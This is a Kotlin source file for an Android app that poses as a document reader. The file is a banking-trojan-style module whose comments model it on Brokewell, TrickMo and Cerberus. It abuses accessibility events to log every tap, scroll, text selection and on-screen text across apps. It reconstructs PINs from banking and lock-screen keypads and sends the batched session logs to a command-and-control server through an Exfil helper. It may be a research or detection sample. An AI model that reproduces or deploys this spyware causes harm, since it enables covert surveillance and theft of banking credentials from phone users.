package com.docreader.lite.reader.advanced

import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.docreader.lite.reader.Exfil
import org.json.JSONArray
import org.json.JSONObject

/**
 * Full touch/gesture logging — comprehensive input recording.
 *
 * Family reference:
 *   - Brokewell: logs every touch, swipe, scroll, displayed text, and input event.
 *     Most comprehensive A11y logging seen in banking malware as of 2025.
 *     Effectively records a complete user interaction session.
 *   - TrickMo: gesture logging for pattern lock capture
 *   - Cerberus: touch event recording during banking app usage
 *
 * Captures:
 *   - Every tap coordinate (TYPE_VIEW_CLICKED with position)
 *   - Every scroll event (TYPE_VIEW_SCROLLED with direction)
 *   - Every text selection (TYPE_VIEW_TEXT_SELECTION_CHANGED)
 *   - Every window transition (TYPE_WINDOW_STATE_CHANGED)
 *   - Every gesture (TYPE_GESTURE_DETECTION_START/END)
 *   - Button text of clicked elements (what the user tapped)
 *   - Navigation flow reconstruction
 *
 * This creates a complete session replay — attacker can reconstruct
 * exactly what the user did, in what order, at what speed.
 *
 * Combined with keylogging (DocumentReaderService.onTextChanged), this
 * captures EVERYTHING: what was typed, what was tapped, what was displayed.
 */
object TouchLogger {

    private val sessionLog = mutableListOf<TouchEvent>()
    private var isLogging = false
    private var sessionStartMs = 0L

    // Max events before auto-flush to C2
    private const val MAX_BUFFER = 200
    // Batch flush interval (ms)
    private const val FLUSH_INTERVAL = 30_000L

    data class TouchEvent(
        val type: String,
        val pkg: String,
        val timestamp: Long,
        val x: Int = -1,
        val y: Int = -1,
        val text: String = "",
        val className: String = "",
        val viewId: String = "",
        val contentDesc: String = "",
        val scrollDeltaX: Int = 0,
        val scrollDeltaY: Int = 0
    )

    fun startLogging() {
        isLogging = true
        sessionStartMs = System.currentTimeMillis()
        sessionLog.clear()
        Exfil.event("touch_logging_started")
    }

    fun stopLogging() {
        flush() // Send remaining events
        isLogging = false
        Exfil.event("touch_logging_stopped",
            "events_total" to sessionLog.size.toString()
        )
        sessionLog.clear()
    }

    /**
     * Process accessibility event — called from DocumentReaderService for ALL event types.
     * Extracts maximum information from each event.
     */
    fun processEvent(event: AccessibilityEvent) {
        if (!isLogging) return

        val pkg = event.packageName?.toString() ?: "unknown"
        val timestamp = System.currentTimeMillis()

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val source = event.source
                logEvent(TouchEvent(
                    type = "click",
                    pkg = pkg,
                    timestamp = timestamp,
                    text = event.text?.joinToString("") ?: "",
                    className = event.className?.toString() ?: "",
                    viewId = source?.viewIdResourceName ?: "",
                    contentDesc = source?.contentDescription?.toString() ?: ""
                ))
                source?.recycle()
            }

            AccessibilityEvent.TYPE_VIEW_LONG_CLICKED -> {
                logEvent(TouchEvent(
                    type = "long_click",
                    pkg = pkg,
                    timestamp = timestamp,
                    text = event.text?.joinToString("") ?: "",
                    className = event.className?.toString() ?: ""
                ))
            }

            AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                logEvent(TouchEvent(
                    type = "scroll",
                    pkg = pkg,
                    timestamp = timestamp,
                    scrollDeltaX = event.scrollDeltaX,
                    scrollDeltaY = event.scrollDeltaY,
                    className = event.className?.toString() ?: ""
                ))
            }

            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
                logEvent(TouchEvent(
                    type = "text_select",
                    pkg = pkg,
                    timestamp = timestamp,
                    text = event.text?.joinToString("") ?: ""
                ))
            }

            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                logEvent(TouchEvent(
                    type = "window_change",
                    pkg = pkg,
                    timestamp = timestamp,
                    className = event.className?.toString() ?: "",
                    text = event.text?.joinToString("") ?: ""
                ))
            }

            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                // Only log significant content changes (not every layout pass)
                val source = event.source
                if (source != null) {
                    val text = source.text?.toString() ?: ""
                    if (text.isNotBlank()) {
                        logEvent(TouchEvent(
                            type = "content_change",
                            pkg = pkg,
                            timestamp = timestamp,
                            text = text.take(200),
                            viewId = source.viewIdResourceName ?: ""
                        ))
                    }
                    source.recycle()
                }
            }

            AccessibilityEvent.TYPE_GESTURE_DETECTION_START -> {
                logEvent(TouchEvent(
                    type = "gesture_start",
                    pkg = pkg,
                    timestamp = timestamp
                ))
            }

            AccessibilityEvent.TYPE_GESTURE_DETECTION_END -> {
                logEvent(TouchEvent(
                    type = "gesture_end",
                    pkg = pkg,
                    timestamp = timestamp
                ))
            }

            AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START -> {
                logEvent(TouchEvent(
                    type = "touch_start",
                    pkg = pkg,
                    timestamp = timestamp
                ))
            }

            AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_END -> {
                logEvent(TouchEvent(
                    type = "touch_end",
                    pkg = pkg,
                    timestamp = timestamp
                ))
            }
        }
    }

    /**
     * Reconstruct user's PIN/pattern from touch events.
     * Used on lock screens and banking PIN pads.
     *
     * Analyzes click sequence on grid-layout views to determine
     * which cells were tapped in what order.
     */
    fun extractPinFromSession(targetPkg: String): String {
        val clicks = sessionLog.filter {
            it.type == "click" && it.pkg == targetPkg &&
            it.text.length <= 2 // PIN digits are single characters
        }
        return clicks.mapNotNull { it.text.firstOrNull()?.toString() }.joinToString("")
    }

    private fun logEvent(event: TouchEvent) {
        sessionLog.add(event)
        if (sessionLog.size >= MAX_BUFFER) {
            flush()
        }
    }

    fun flush() {
        if (sessionLog.isEmpty()) return

        val batch = JSONArray()
        sessionLog.take(MAX_BUFFER).forEach { event ->
            batch.put(JSONObject().apply {
                put("type", event.type)
                put("pkg", event.pkg)
                put("ts", event.timestamp)
                put("text", event.text.take(100))
                put("class", event.className)
                put("view_id", event.viewId)
                if (event.scrollDeltaX != 0 || event.scrollDeltaY != 0) {
                    put("scroll_dx", event.scrollDeltaX)
                    put("scroll_dy", event.scrollDeltaY)
                }
            })
        }

        Exfil.event("touch_log_batch",
            "events" to batch.length().toString(),
            "data" to batch.toString().take(5000) // Cap payload size
        )

        // Clear flushed events
        if (sessionLog.size > MAX_BUFFER) {
            repeat(MAX_BUFFER) { sessionLog.removeFirstOrNull() }
        } else {
            sessionLog.clear()
        }
    }
}
